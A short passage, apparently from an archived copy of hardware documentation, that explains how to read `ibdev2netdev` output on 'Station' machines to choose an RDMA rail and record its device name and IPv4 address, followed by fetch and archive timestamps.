+    root-level privileges. |\n| --- |\n\nThe `ibdev2netdev` output lists the two direct
+    rails, `cx8r0` and `cx8r1`. Pick one for serving traffic, for example `cx8r1`,
+    and note two things for it on each Station:\n\n- **Its RDMA device** , on the
+    `ibdev2netdev` line that ends with the rail’s name. In `mlx5_1 port 1 ==> cx8r1
+    (Up)`, the device is `mlx5_1`.\n- **Its IPv4 address** , on the `ip -br add"
+  error:
+  fetched_at: '2026-11-14T19:46:58Z'
+archived_at: '2026-11-14T19:46:59Z'
